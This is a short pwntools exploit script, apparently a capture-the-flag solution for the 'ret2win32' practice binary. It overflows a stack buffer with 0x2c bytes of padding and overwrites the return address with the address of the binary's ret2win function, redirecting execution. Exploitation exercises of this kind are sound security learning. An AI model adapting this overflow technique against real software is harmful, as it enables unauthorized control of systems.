from pwn import *

p = process('./ret2win32')
elf = ELF('./ret2win32')

p.recvuntil('>')
payload = 'a'*0x2c+p32(elf.sym['ret2win'])
p.sendline(payload)

p.interactive()